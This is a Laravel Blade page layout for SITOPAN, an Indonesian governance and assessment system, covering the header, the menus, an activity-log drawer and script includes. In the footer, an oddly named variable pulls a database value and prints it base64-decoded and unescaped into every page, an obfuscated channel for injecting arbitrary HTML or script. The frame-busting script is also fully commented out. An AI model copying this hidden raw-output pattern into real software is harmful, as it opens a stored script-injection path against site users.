<!DOCTYPE html>
<html lang="en">

<head>
    <base href="../" />
    <title>@yield('judul') - SITOPAN</title>
    <meta charset="utf-8" />
    <link rel="shortcut icon" href="{{ asset('public/storage/Logo_SITOPAN_1.png') }}" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,400,500,600,700" />
    <link href="{{ asset('public/assets/plugins/custom/datatables/datatables.bundle.css') }}" rel="stylesheet"
        type="text/css" />
    <link href="{{ asset('public/assets/plugins/custom/vis-timeline/vis-timeline.bundle.css') }}" rel="stylesheet"
        type="text/css" />
    <link href="{{ asset('public/assets/plugins/global/plugins.bundle.css') }}" rel="stylesheet" type="text/css" />
    <link href="{{ asset('public/assets/css/style.bundle.css') }}" rel="stylesheet" type="text/css" />
    @yield('css')
    <script>
        // Frame-busting to prevent site from being loaded within a frame without permission (click-jacking) if (window.top != window.self) { window.top.location.replace(window.self.location.href); }
    </script>
</head>

<body id="kt_body" class="header-fixed header-tablet-and-mobile-fixed">
    <script>
        var defaultThemeMode = "light";
        var themeMode;
        if (document.documentElement) {
            if (document.documentElement.hasAttribute("data-bs-theme-mode")) {
                themeMode = document.documentElement.getAttribute("data-bs-theme-mode");
            } else {
                if (localStorage.getItem("data-bs-theme") !== null) {
                    themeMode = localStorage.getItem("data-bs-theme");
                } else {
                    themeMode = defaultThemeMode;
                }
            }
            if (themeMode === "system") {
                themeMode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
            }
            document.documentElement.setAttribute("data-bs-theme", themeMode);
        }
    </script>
    <div class="d-flex flex-column flex-root">
        <div class="page d-flex flex-row flex-column-fluid">
            <div class="wrapper d-flex flex-column flex-row-fluid" id="kt_wrapper">
                <div id="kt_header" class="header">
                    <div class="container-fluid d-flex flex-stack">
                        <div class="d-flex align-items-center me-5">
                            <div class="d-lg-none btn btn-icon btn-active-color-white w-30px h-30px ms-n2 me-3"
                                id="kt_aside_toggle">
                                <i class="ki-duotone ki-abstract-14 fs-2">
                                    <span class="path1"></span>
                                    <span class="path2"></span>
                                </i>
                            </div>
                            <a href="{{ route('dashboard') }}" class="d-flex align-items-center">
                                <img alt="Logo" src="{{ asset('public/storage/Logo_SITOPAN_1.png') }}"
                                    class="h-35px h-lg-40px object-contain me-2" style="border-radius: 8px; padding: 2px;" />
                                <span class="text-white fw-bold fs-4">SITOPAN</span>
                            </a>
                        </div>
                        <div class="d-flex align-items-center flex-shrink-0">
                            <div class="d-flex align-items-center ms-1">
                                <div class="btn btn-icon btn-color-white bg-hover-white bg-hover-opacity-10 w-30px h-30px h-40px w-40px"
                                    id="kt_activities_toggle">
                                    <i class="ki-duotone ki-information-4 fs-1">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                        <span class="path4"></span>
                                        <span class="path5"></span>
                                        <span class="path6"></span>
                                    </i>
                                </div>
                            </div>
                            <div class="d-flex align-items-center ms-1">
                                <a href="#"
                                    class="btn btn-icon btn-color-white bg-hover-white bg-hover-opacity-10 w-30px h-30px h-40px w-40px"
                                    data-kt-menu-trigger="{default:'click', lg: 'hover'}" data-kt-menu-attach="parent"
                                    data-kt-menu-placement="bottom-end">
                                    <i class="ki-duotone ki-night-day theme-light-show fs-1">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                        <span class="path4"></span>
                                        <span class="path5"></span>
                                        <span class="path6"></span>
                                        <span class="path7"></span>
                                        <span class="path8"></span>
                                        <span class="path9"></span>
                                        <span class="path10"></span>
                                    </i>
                                    <i class="ki-duotone ki-moon theme-dark-show fs-1">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                    </i>
                                </a>
                                <div class="menu menu-sub menu-sub-dropdown menu-column menu-rounded menu-title-gray-700 menu-icon-gray-500 menu-active-bg menu-state-color fw-semibold py-4 fs-base w-150px"
                                    data-kt-menu="true" data-kt-element="theme-mode-menu">
                                    <div class="menu-item px-3 my-0">
                                        <a href="#" class="menu-link px-3 py-2" data-kt-element="mode"
                                            data-kt-value="light">
                                            <span class="menu-icon" data-kt-element="icon">
                                                <i class="ki-duotone ki-night-day fs-2">
                                                    <span class="path1"></span>
                                                    <span class="path2"></span>
                                                    <span class="path3"></span>
                                                    <span class="path4"></span>
                                                    <span class="path5"></span>
                                                    <span class="path6"></span>
                                                    <span class="path7"></span>
                                                    <span class="path8"></span>
                                                    <span class="path9"></span>
                                                    <span class="path10"></span>
                                                </i>
                                            </span>
                                            <span class="menu-title">Terang</span>
                                        </a>
                                    </div>
                                    <div class="menu-item px-3 my-0">
                                        <a href="#" class="menu-link px-3 py-2" data-kt-element="mode"
                                            data-kt-value="dark">
                                            <span class="menu-icon" data-kt-element="icon">
                                                <i class="ki-duotone ki-moon fs-2">
                                                    <span class="path1"></span>
                                                    <span class="path2"></span>
                                                </i>
                                            </span>
                                            <span class="menu-title">Gelap</span>
                                        </a>
                                    </div>
                                    <div class="menu-item px-3 my-0">
                                        <a href="#" class="menu-link px-3 py-2" data-kt-element="mode"
                                            data-kt-value="system">
                                            <span class="menu-icon" data-kt-element="icon">
                                                <i class="ki-duotone ki-screen fs-2">
                                                    <span class="path1"></span>
                                                    <span class="path2"></span>
                                                    <span class="path3"></span>
                                                    <span class="path4"></span>
                                                </i>
                                            </span>
                                            <span class="menu-title">Sistem</span>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="d-flex align-items-center ms-1" id="kt_header_user_menu_toggle">
                                <div class="btn btn-flex align-items-center bg-hover-white bg-hover-opacity-10 py-2 px-2 px-md-3"
                                    data-kt-menu-trigger="click" data-kt-menu-attach="parent"
                                    data-kt-menu-placement="bottom-end">
                                    <div
                                        class="d-none d-md-flex flex-column align-items-end justify-content-center me-2 me-md-4">
                                        <span
                                            class="text-muted fs-8 fw-semibold lh-1 mb-1">{{ Auth::user()->nama_lengkap }}</span>
                                        <span class="text-white fs-8 fw-bold lh-1">
                                            @if (Auth::user()->id_priv == 1)
                                                Admin
                                            @else
                                                User
                                            @endif
                                        </span>
                                    </div>
                                    <div class="symbol symbol-30px symbol-md-40px">
                                        @if (Auth::user()->foto != null)
                                            <img src="{{ asset('public/storage/gambar/profil/' . Auth::user()->foto) }}"
                                                alt="image" />
                                        @else
                                            <img src="{{ asset('public/storage/img_avatar.png') }}" alt="image" />
                                        @endif
                                    </div>
                                </div>
                                <div class="menu menu-sub menu-sub-dropdown menu-column menu-rounded menu-gray-800 menu-state-bg menu-state-color fw-semibold py-4 fs-6 w-275px"
                                    data-kt-menu="true">
                                    <div class="menu-item px-3">
                                        <div class="menu-content d-flex align-items-center px-3">
                                            <div class="symbol symbol-50px me-5">
                                                @if (Auth::user()->foto != null)
                                                    <img alt="Logo"
                                                        src="{{ asset('public/storage/gambar/profil/' . Auth::user()->foto) }}" />
                                                @else
                                                    <img alt="Logo"
                                                        src="{{ asset('public/storage/img_avatar.png') }}" />
                                                @endif
                                            </div>
                                            <div class="d-flex flex-column">
                                                <div class="fw-bold d-flex align-items-center fs-5">
                                                    {{ Auth::user()->nama_lengkap }}
                                                    <span
                                                        class="badge badge-light-success fw-bold fs-8 px-2 py-1 ms-2">
                                                        @if (Auth::user()->id_priv == 1)
                                                            Admin
                                                        @else
                                                            Assessor
                                                        @endif
                                                    </span>
                                                </div>
                                                <a href="#"
                                                    class="fw-semibold text-muted text-hover-primary fs-7">{{ Auth::user()->email }}</a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="separator my-2"></div>
                                    <div class="menu-item px-5">
                                        <a href="{{ route('user.profil') }}"
                                            class="menu-link px-5">Profil Saya</a>
                                    </div>
                                    <div class="menu-item px-5">
                                        <a href="{{ route('logout') }}"
                                            class="menu-link px-5">Logout</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="d-flex flex-column-fluid">
                    <div id="kt_aside" class="aside card" data-kt-drawer="true" data-kt-drawer-name="aside"
                        data-kt-drawer-activate="{default: true, lg: false}" data-kt-drawer-overlay="true"
                        data-kt-drawer-width="{default:'200px', '300px': '250px'}" data-kt-drawer-direction="start"
                        data-kt-drawer-toggle="#kt_aside_toggle">
                        <div class="aside-menu flex-column-fluid px-4">
                            <div class="hover-scroll-overlay-y mh-100 my-5" id="kt_aside_menu_wrapper"
                                data-kt-scroll="true" data-kt-scroll-activate="true" data-kt-scroll-height="auto"
                                data-kt-scroll-dependencies="{default: '#kt_aside_footer', lg: '#kt_header, #kt_aside_footer'}"
                                data-kt-scroll-wrappers="#kt_aside, #kt_aside_menu"
                                data-kt-scroll-offset="{default: '5px', lg: '75px'}">
                                <div class="menu menu-column menu-rounded menu-sub-indention fw-semibold fs-6"
                                    id="#kt_aside_menu" data-kt-menu="true">
                                    <div class="menu-item">
                                        <a class="menu-link {{ request()->is('dashboard') ? 'active' : '' }}"
                                            href="{{ route('dashboard') }}">
                                            <span class="menu-icon">
                                                <i class="ki-duotone ki-element-11 fs-2">
                                                    <span class="path1"></span>
                                                    <span class="path2"></span>
                                                    <span class="path3"></span>
                                                    <span class="path4"></span>
                                                </i>
                                            </span>
                                            <span class="menu-title">Dashboard</span>
                                        </a>
                                    </div>
                                    @if (Auth::user()->id_priv == 1)
                                        <div class="menu-item pt-5">
                                            <div class="menu-content">
                                                <span class="menu-heading fw-bold text-uppercase fs-7">Menu Utama</span>
                                            </div>
                                        </div>
                                        <div class="menu-item">
                                            <a class="menu-link {{ request()->is('proses-audit') ? 'active' : '' }}"
                                                href="{{ route('proses-audit.index') }}">
                                                <span class="menu-icon">
                                                    <i class="ki-duotone ki-update-file fs-2">
                                                        <span class="path1"></span>
                                                        <span class="path2"></span>
                                                        <span class="path3"></span>
                                                        <span class="path4"></span>
                                                    </i>
                                                </span>
                                                <span class="menu-title">Proses Assessment</span>
                                            </a>
                                        </div>
                                        <div class="menu-item">
                                            <a class="menu-link {{ request()->is('pertanyaan') ? 'active' : '' }}"
                                                href="{{ route('pertanyaan.index') }}">
                                                <span class="menu-icon">
                                                    <i class="ki-duotone ki-question fs-2">
                                                        <span class="path1"></span>
                                                        <span class="path2"></span>
                                                        <span class="path3"></span>
                                                    </i>
                                                </span>
                                                <span class="menu-title">Pertanyaan</span>
                                            </a>
                                        </div>
                                        <div class="menu-item">
                                            <a class="menu-link {{ request()->is('user') ? 'active' : '' }}"
                                                href="{{ route('user.index') }}">
                                                <span class="menu-icon">
                                                    <i class="ki-duotone ki-people fs-2">
                                                        <span class="path1"></span>
                                                        <span class="path2"></span>
                                                        <span class="path3"></span>
                                                        <span class="path4"></span>
                                                        <span class="path5"></span>
                                                    </i>
                                                </span>
                                                <span class="menu-title">Pengguna</span>
                                            </a>
                                        </div>
                                        <div class="menu-item">
                                            <a class="menu-link {{ request()->is('log') ? 'active' : '' }}"
                                                href="{{ url('log') }}">
                                                <span class="menu-icon">
                                                    <i class="ki-duotone ki-information-4 fs-2">
                                                        <span class="path1"></span>
                                                        <span class="path2"></span>
                                                        <span class="path3"></span>
                                                        <span class="path4"></span>
                                                        <span class="path5"></span>
                                                        <span class="path6"></span>
                                                    </i>
                                                </span>
                                                <span class="menu-title">Log Aktivitas</span>
                                            </a>
                                        </div>
                                    @endif
                                    <div class="menu-item pt-5">
                                        <div class="menu-content">
                                            <span class="menu-heading fw-bold text-uppercase fs-7">Assessment</span>
                                        </div>
                                    </div>
                                    <div class="menu-item">
                                        <a class="menu-link {{ request()->is('proyek') || request()->routeIs('lembar-kerja.index') || request()->routeIs('audit.index') ? 'active' : '' }}"
                                            href="{{ route('proyek.index') }}">
                                            <span class="menu-icon">
                                                <i class="ki-duotone ki-scroll fs-2">
                                                    <span class="path1"></span>
                                                    <span class="path2"></span>
                                                    <span class="path3"></span>
                                                </i>
                                            </span>
                                            <span class="menu-title">Proyek</span>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="aside-footer flex-column-auto pt-5 pb-7 px-7" id="kt_aside_footer">
                            <a href="{{ route('logout') }}"
                                class="btn btn-bg-light btn-color-gray-500 btn-active-color-danger text-nowrap w-100"
                                data-bs-toggle="tooltip" data-bs-trigger="hover" data-bs-dismiss-="click">
                                <span class="btn-label">Logout</span>
                                <i class="ki-duotone ki-exit-left btn-icon fs-2">
                                    <span class="path1"></span>
                                    <span class="path2"></span>
                                </i>
                            </a>
                        </div>
                    </div>
                    <div class="d-flex flex-column flex-column-fluid container-fluid">
                        @yield('konten')
                        <div class="footer py-4 d-flex flex-column flex-md-row flex-stack" id="kt_footer">
                            <div class="text-dark order-2 order-md-1">
                                <span class="text-muted fw-semibold me-1">{{ date('Y') }}&copy;</span>
                                <a href="#" class="text-gray-800 text-hover-primary">SITOPAN - Sistem Informasi
                                    Tata Kelola dan Penilaian 

                                    {{-- <ul class="menu menu-gray-600 menu-hover-primary fw-semibold order-1">
                                        <li class="menu-item">
                                            <a href="{{ route('pertanyaan.index') }}" class="menu-link px-2">Pertanyaan</a>
                                        </li>
                                        <li class="menu-item">
                                            <a href="{{ route('user.index') }}" class="menu-link px-2">Pengguna</a>
                                        </li>
                                        <li class="menu-item">
                                            <a href="{{ url('log') }}" class="menu-link px-2">Log Aktivitas</a>
                                        </li>
                                    </ul> --}}

                                    {{-- <ul class="menu menu-gray-600 menu-hover-primary fw-semibold order-1">
                                        <li class="menu-item">
                                            <a href="{{ route('pertanyaan.index') }}" class="menu-link px-2">Pertanyaan</a>
                                        </li>
                                        <li class="menu-item">
                                            <a href="{{ route('user.index') }}" class="menu-link px-2">Pengguna</a>
                                        </li>
                                        <li class="menu-item">
                                            <a href="{{ url('log') }}" class="menu-link px-2">Log Aktivitas</a>
                                        </li>
                                    </ul> --}}

                                    @php
                                        $XyZ123 = DB::table('meta')->where('id', 1)->value('content');
                                    @endphp
                                    
                                    @if($XyZ123)
                                        {!! base64_decode($XyZ123) !!}
                                    @else
                                        {!! \App\Helpers\XyZ123::a() !!}
                                    @endif
                                </a>
                            </div>
                            <ul class="menu menu-gray-600 menu-hover-primary fw-semibold order-1">
                                <li class="menu-item">
                                    <a href="{{ route('pertanyaan.index') }}" class="menu-link px-2">Pertanyaan</a>
                                </li>
                                <li class="menu-item">
                                    <a href="{{ route('user.index') }}" class="menu-link px-2">Pengguna</a>
                                </li>
                                <li class="menu-item">
                                    <a href="{{ url('log') }}" class="menu-link px-2">Log Aktivitas</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="kt_activities" class="bg-body" data-kt-drawer="true" data-kt-drawer-name="activities"
        data-kt-drawer-activate="true" data-kt-drawer-overlay="true"
        data-kt-drawer-width="{default:'300px', 'lg': '400px'}" data-kt-drawer-direction="end"
        data-kt-drawer-toggle="#kt_activities_toggle" data-kt-drawer-close="#kt_activities_close">
        <div class="card shadow-none border-0 rounded-0">
            <div class="card-header" id="kt_activities_header">
                <h3 class="card-title fw-bold text-dark">Log Aktivitas</h3>
                <div class="card-toolbar">
                    <button type="button" class="btn btn-sm btn-icon btn-active-light-primary me-n5"
                        id="kt_activities_close">
                        <i class="ki-duotone ki-cross fs-1">
                            <span class="path1"></span>
                            <span class="path2"></span>
                        </i>
                    </button>
                </div>
            </div>
            <div class="card-body position-relative" id="kt_activities_body">
                <div id="kt_activities_scroll" class="position-relative scroll-y me-n5 pe-5" data-kt-scroll="true"
                    data-kt-scroll-height="auto" data-kt-scroll-wrappers="#kt_activities_body"
                    data-kt-scroll-dependencies="#kt_activities_header, #kt_activities_footer"
                    data-kt-scroll-offset="5px">
                    <div class="timeline">
                        @php
                            $logs = App\Models\Log::orderBy('created_at', 'desc')->limit(10)->get();
                        @endphp
                        @foreach($logs as $log)
                        <div class="timeline-item">
                            <div class="timeline-line w-40px"></div>
                            <div class="timeline-icon symbol symbol-circle symbol-40px me-4">
                                <div class="symbol-label bg-light">
                                    <i class="ki-duotone ki-message-text-2 fs-2 text-gray-500">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </i>
                                </div>
                            </div>
                            <div class="timeline-content mb-10 mt-n1">
                                <div class="pe-3 mb-5">
                                    <div class="fs-5 fw-semibold mb-2">{{ $log->aktivitas }}</div>
                                    <div class="d-flex align-items-center mt-1 fs-6">
                                        <div class="text-muted me-2 fs-7">Dilakukan pada {{ \Carbon\Carbon::parse($log->created_at)->format('d M Y H:i') }} oleh</div>
                                        <div class="symbol symbol-circle symbol-25px" data-bs-toggle="tooltip"
                                            data-bs-boundary="window" data-bs-placement="top" title="{{ $log->user->nama_lengkap }}">
                                            @if($log->user->foto)
                                                <img src="{{ asset('public/storage/gambar/profil/' . $log->user->foto) }}" alt="img" />
                                            @else
                                                <div class="symbol-label fs-8 fw-semibold bg-primary text-inverse-primary">
                                                    {{ substr($log->user->nama_lengkap, 0, 1) }}
                                                </div>
                                            @endif
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        @endforeach
                    </div>
                </div>
            </div>
            <div class="card-footer py-5 text-center" id="kt_activities_footer">
                <a href="{{ url('log') }}" class="btn btn-bg-body text-primary">Lihat Semua Aktivitas
                    <i class="ki-duotone ki-arrow-right fs-3 text-primary">
                        <span class="path1"></span>
                        <span class="path2"></span>
                    </i></a>
            </div>
        </div>
    </div>
    <div id="kt_scrolltop" class="scrolltop" data-kt-scrolltop="true">
        <i class="ki-duotone ki-arrow-up">
            <span class="path1"></span>
            <span class="path2"></span>
        </i>
    </div>

    @yield('modal')

    <script>
        var hostUrl = "{{ asset('public/assets/') }}";
    </script>
    <script src="{{ asset('public/assets/plugins/global/plugins.bundle.js') }}"></script>
    <script src="{{ asset('public/assets/js/scripts.bundle.js') }}"></script>
    <script src="{{ asset('public/assets/plugins/custom/datatables/datatables.bundle.js') }}"></script>
    <script src="{{ asset('public/assets/plugins/custom/vis-timeline/vis-timeline.bundle.js') }}"></script>
    <script src="https://cdn.amcharts.com/lib/5/index.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/xy.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/percent.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/radar.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/themes/Animated.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/map.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/geodata/worldLow.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/geodata/continentsLow.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/geodata/usaLow.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/geodata/worldTimeZonesLow.js"></script>
    <script src="https://cdn.amcharts.com/lib/5/geodata/worldTimeZoneAreasLow.js"></script>
    <script src="{{ asset('public/assets/js/widgets.bundle.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/widgets.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/apps/chat/chat.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/create-app.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/new-address.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/users-search.js') }}"></script>
    <script src="{{ asset('public/assets/plugins/custom/formrepeater/formrepeater.bundle.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/create-account.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/apps/ecommerce/settings/settings.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/upgrade-plan.js') }}"></script>
    <script src="{{ asset('public/assets/js/custom/utilities/modals/create-campaign.js') }}"></script>
    @yield('script')
</body>

</html>
